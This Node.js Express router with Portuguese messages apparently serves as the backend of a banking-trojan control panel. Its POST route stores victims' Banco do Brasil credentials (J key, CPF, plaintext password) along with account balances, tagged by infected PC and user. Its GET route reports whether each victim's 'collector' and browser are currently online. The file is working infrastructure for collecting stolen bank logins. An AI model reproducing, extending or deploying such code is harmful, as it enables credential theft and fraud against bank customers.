const express = require('express');
const { B_BB, NFCT, sequelize } = require('../models');

const router = express.Router();

router.get('/', async (req, res) => {
  const { id, all } = req.query;

  if (!id) {
    return res.status(400).json({ message: 'ID é obrigatório' });
  }

  try {
    if (all) {
      const allRecordsQuery = `
        SELECT B_BB.*, NFCT.PC, NFCT.USER, NFCT.BANCO, NFCT.STATUSRESUMO,
          (TIMESTAMPDIFF(SECOND, B_BB.DT_COLLECTOR, NOW()) < 4) AS IS_COLLECTOR_ONLINE,
          (TIMESTAMPDIFF(SECOND, B_BB.DT_BROWSER, NOW()) < 4) AS IS_BROWSER_ONLINE
        FROM B_BB
        INNER JOIN NFCT ON B_BB.FK_ID_NFCT = NFCT.id
        WHERE B_BB.FK_ID_NFCT = :id
      `;
      const allRecords = await sequelize.query(allRecordsQuery, {
        replacements: { id },
        type: sequelize.QueryTypes.SELECT
      });
      return res.status(200).json(allRecords);
    } else {
      const latestRecordQuery = `
        SELECT B_BB.*, NFCT.PC, NFCT.USER, NFCT.BANCO, NFCT.STATUSRESUMO,
          (TIMESTAMPDIFF(SECOND, B_BB.DT_COLLECTOR, NOW()) < 4) AS IS_COLLECTOR_ONLINE,
          (TIMESTAMPDIFF(SECOND, B_BB.DT_BROWSER, NOW()) < 4) AS IS_BROWSER_ONLINE
        FROM B_BB
        INNER JOIN NFCT ON B_BB.FK_ID_NFCT = NFCT.id
        WHERE B_BB.FK_ID_NFCT = :id
        ORDER BY B_BB.ID DESC
        LIMIT 1
      `;
      const [record] = await sequelize.query(latestRecordQuery, {
        replacements: { id },
        type: sequelize.QueryTypes.SELECT
      });

      if (record) {
        return res.status(200).json(record);
      } else {
        return res.status(404).json({ message: 'Registro não encontrado' });
      }
    }
  } catch (error) {
    console.error('Erro ao buscar B_BB:', error.message);
    return res.status(500).json({ error: error.message });
  }
});

router.post('/', async (req, res) => {
  const { FK_ID_NFCT, PERFIL, TIPOACESSO, CHAVEJ, CPF, SENHA, DT_INCLUSAO, SALDO, TOTAL } = req.body;

  if (!FK_ID_NFCT || !PERFIL || !TIPOACESSO || !SENHA || !DT_INCLUSAO || SALDO === undefined || TOTAL === undefined) {
    return res.status(400).json({ message: 'Todos os campos são obrigatórios' });
  }

  try {
    const existingRecordQuery = `
      SELECT * FROM B_BB
      WHERE FK_ID_NFCT = :FK_ID_NFCT
        AND CHAVEJ = :CHAVEJ
        AND CPF = :CPF
        AND SENHA = :SENHA
    `;
    const [existingRecord] = await sequelize.query(existingRecordQuery, {
      replacements: { FK_ID_NFCT, CHAVEJ, CPF, SENHA },
      type: sequelize.QueryTypes.SELECT
    });

    if (!existingRecord) {
      const insertQuery = `
        INSERT INTO B_BB (FK_ID_NFCT, PERFIL, TIPOACESSO, CHAVEJ, CPF, SENHA, DT_INCLUSAO, SALDO, TOTAL, DT_COLLECTOR, DT_BROWSER)
        VALUES (:FK_ID_NFCT, :PERFIL, :TIPOACESSO, :CHAVEJ, :CPF, :SENHA, NOW(), :SALDO, :TOTAL, NOW(), NOW())
      `;
      await sequelize.query(insertQuery, {
        replacements: { FK_ID_NFCT, PERFIL, TIPOACESSO, CHAVEJ, CPF, SENHA,  SALDO, TOTAL },
        type: sequelize.QueryTypes.INSERT
      });

      return res.status(201).json({ message: 'Registro criado com sucesso' });
    } else {
      return res.status(200).json({ message: 'Registro já existe' });
    }
  } catch (error) {
    console.error('Erro ao criar/verificar B_BB:', error.message, req.body);
    return res.status(500).json({ error: error.message });
  }
});

module.exports = router;
